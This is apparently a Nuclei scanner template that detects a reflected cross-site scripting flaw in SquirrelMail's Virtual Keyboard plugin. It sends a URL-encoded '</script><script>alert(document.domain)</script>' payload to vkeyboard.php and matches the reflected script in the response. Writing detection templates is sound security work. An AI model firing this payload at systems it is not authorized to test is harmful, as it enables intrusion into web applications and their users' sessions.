id: squirrelmail-vkeyboard-xss
info:
  author: dhiyaneshDk
  description: The Virtual Keyboard plugin for SquirrelMail is prone to a cross-site
    scripting vulnerability because it fails to properly sanitize user-supplied input.
  name: SquirrelMail Virtual Keyboard Plugin - 'vkeyboard.php' Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/34814
  severity: medium
  tags: xss,squirrelmail,plugin
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/plugins/vkeyboard/vkeyboard.php?passformname=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
